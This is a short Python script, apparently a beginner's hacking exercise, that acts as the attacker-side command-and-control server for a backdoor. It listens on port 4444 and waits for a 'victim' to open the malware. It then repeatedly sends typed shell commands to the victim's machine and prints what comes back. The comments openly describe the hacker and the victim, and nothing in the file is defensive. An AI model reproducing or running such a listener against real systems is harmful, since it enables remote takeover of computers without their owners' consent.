import socket  # import socket module


my_ip = '192.168.56.1' # define my IP address
port = 4444 # define port
server = socket.socket()
server.bind((my_ip, port)) # create server
print('[+] Server Started') 
print('[+] Listening For Victim')
server.listen(1) # started server
victim, victim_addr = server.accept() # wait for victim to open malware
print(f'[+] {victim_addr} Victim opened the backdoor')

while True: # sending commands and receiving outputs repeated until program is closed
    command = input('Enter Command : ') # wait for hacker to enter the command to run on victim's computer
    command = command.encode() # code command
    victim.send(command) # send command
    print('[+] Command sent')
    output = victim.recv(1024) # receive output from victim
    output = output.decode() # decode output
    print(f"Output: {output}")